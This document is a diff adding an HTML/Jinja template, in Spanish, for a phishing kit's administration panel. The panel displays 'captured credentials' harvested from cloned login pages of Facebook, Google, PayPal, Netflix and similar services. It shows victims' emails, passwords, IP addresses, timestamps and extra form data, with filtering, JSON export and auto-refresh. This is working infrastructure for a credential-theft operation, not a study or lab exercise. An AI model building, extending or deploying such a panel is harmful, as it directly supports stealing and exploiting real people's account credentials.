@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Administración - Credenciales Capturadas</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(45deg, #2c3e50, #34495e);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            font-weight: 300;
+        }
+        
+        .nav {
+            background: #f8f9fa;
+            padding: 20px 30px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        
+        .nav a {
+            display: inline-block;
+            padding: 10px 20px;
+            background: #007bff;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-right: 10px;
+            transition: background 0.3s;
+        }
+        
+        .nav a:hover {
+            background: #0056b3;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .stat-card h3 {
+            font-size: 2em;
+            margin-bottom: 5px;
+        }
+        
+        .controls {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .controls select, .controls button {
+            padding: 10px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background: white;
+        }
+        
+        .controls button {
+            background: #28a745;
+            color: white;
+            cursor: pointer;
+            border: none;
+        }
+        
+        .controls button:hover {
+            background: #1e7e34;
+        }
+        
+        .credentials-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .credentials-table th {
+            background: linear-gradient(45deg, #2c3e50, #34495e);
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 500;
+        }
+        
+        .credentials-table td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .credentials-table tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .site-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            color: white;
+            font-size: 0.8em;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        
+        .site-facebook { background: #1877f2; }
+        .site-google { background: #4285f4; }
+        .site-instagram { background: #e4405f; }
+        .site-github { background: #333; }
+        .site-linkedin { background: #0077b5; }
+        .site-twitter { background: #1da1f2; }
+        .site-netflix { background: #e50914; }
+        .site-spotify { background: #1db954; }
+        .site-paypal { background: #0070ba; }
+        .site-microsoft { background: #00a1f1; }
+        .site-default { background: #6c757d; }
+        
+        .email-field {
+            font-family: monospace;
+            background: #f8f9fa;
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid #dee2e6;
+        }
+        
+        .password-field {
+            font-family: monospace;
+            background: #fff3cd;
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid #ffeaa7;
+            cursor: pointer;
+        }
+        
+        .password-field:hover {
+            background: #ffeaa7;
+        }
+        
+        .timestamp {
+            color: #6c757d;
+            font-size: 0.9em;
+        }
+        
+        .ip-address {
+            font-family: monospace;
+            font-size: 0.9em;
+            color: #495057;
+        }
+        
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: #6c757d;
+        }
+        
+        .extra-data {
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            cursor: pointer;
+            color: #007bff;
+        }
+        
+        .extra-data:hover {
+            color: #0056b3;
+        }
+        
+        @media (max-width: 768px) {
+            .credentials-table {
+                font-size: 0.8em;
+            }
+            
+            .credentials-table th,
+            .credentials-table td {
+                padding: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📊 Panel de Administración</h1>
+            <p>Credenciales Capturadas y Estadísticas</p>
+        </div>
+        
+        <div class="nav">
+            <a href="/">🏠 Inicio</a>
+            <a href="/admin">📊 Administración</a>
+            <a href="/admin/export" download="credentials.json">💾 Exportar JSON</a>
+        </div>
+        
+        <div class="content">
+            <div class="stats">
+                <div class="stat-card">
+                    <h3>{{ credentials|length }}</h3>
+                    <p>Total Credenciales</p>
+                </div>
+                <div class="stat-card">
+                    <h3>{{ sites|length }}</h3>
+                    <p>Sitios Activos</p>
+                </div>
+                <div class="stat-card">
+                    <h3>{{ credentials|map(attribute='site_name')|unique|list|length }}</h3>
+                    <p>Sitios con Datos</p>
+                </div>
+            </div>
+            
+            <div class="controls">
+                <select id="siteFilter" onchange="filterBySite()">
+                    <option value="">🌐 Todos los sitios</option>
+                    {% for site in sites %}
+                    <option value="{{ site }}">{{ site.title() }}</option>
+                    {% endfor %}
+                </select>
+                <button onclick="refreshData()">🔄 Actualizar</button>
+                <button onclick="clearFilter()">🧹 Limpiar Filtro</button>
+            </div>
+            
+            {% if credentials %}
+            <table class="credentials-table" id="credentialsTable">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Sitio</th>
+                        <th>Email/Usuario</th>
+                        <th>Contraseña</th>
+                        <th>IP</th>
+                        <th>Fecha/Hora</th>
+                        <th>Datos Extra</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for cred in credentials %}
+                    <tr data-site="{{ cred.site_name }}">
+                        <td>{{ cred.id }}</td>
+                        <td>
+                            <span class="site-badge site-{{ cred.site_name }} site-default">
+                                {{ cred.site_name }}
+                            </span>
+                        </td>
+                        <td>
+                            {% if cred.email %}
+                            <span class="email-field">{{ cred.email }}</span>
+                            {% else %}
+                            <span style="color: #6c757d;">No capturado</span>
+                            {% endif %}
+                        </td>
+                        <td>
+                            {% if cred.password %}
+                            <span class="password-field" onclick="togglePassword(this)" data-password="{{ cred.password }}">
+                                ••••••••
+                            </span>
+                            {% else %}
+                            <span style="color: #6c757d;">No capturado</span>
+                            {% endif %}
+                        </td>
+                        <td class="ip-address">{{ cred.ip_address or 'No registrada' }}</td>
+                        <td class="timestamp">{{ cred.timestamp }}</td>
+                        <td>
+                            {% if cred.extra_data %}
+                            <span class="extra-data" onclick="showExtraData({{ cred.extra_data|tojson }})">
+                                Ver datos adicionales
+                            </span>
+                            {% else %}
+                            <span style="color: #6c757d;">Sin datos</span>
+                            {% endif %}
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% else %}
+            <div class="no-data">
+                <h3>😴 No hay credenciales capturadas aún</h3>
+                <p>Las credenciales aparecerán aquí cuando los usuarios interactúen con los sitios desplegados.</p>
+            </div>
+            {% endif %}
+        </div>
+    </div>
+    
+    <script>
+        function togglePassword(element) {
+            const password = element.getAttribute('data-password');
+            if (element.textContent === '••••••••') {
+                element.textContent = password;
+                element.style.background = '#d4edda';
+            } else {
+                element.textContent = '••••••••';
+                element.style.background = '#fff3cd';
+            }
+        }
+        
+        function showExtraData(data) {
+            try {
+                const parsedData = JSON.parse(data);
+                let formattedData = '';
+                for (const [key, value] of Object.entries(parsedData)) {
+                    formattedData += `${key}: ${value}\n`;
+                }
+                alert('Datos adicionales del formulario:\n\n' + formattedData);
+            } catch (e) {
+                alert('Datos adicionales:\n\n' + data);
+            }
+        }
+        
+        function filterBySite() {
+            const filter = document.getElementById('siteFilter').value;
+            const rows = document.querySelectorAll('#credentialsTable tbody tr');
+            
+            rows.forEach(row => {
+                const siteName = row.getAttribute('data-site');
+                if (filter === '' || siteName === filter) {
+                    row.style.display = '';
+                } else {
+                    row.style.display = 'none';
+                }
+            });
+        }
+        
+        function clearFilter() {
+            document.getElementById('siteFilter').value = '';
+            filterBySite();
+        }
+        
+        function refreshData() {
+            location.reload();
+        }
+        
+        // Auto refresh cada 30 segundos
+        setInterval(refreshData, 30000);
+    </script>
+</body>
+</html>
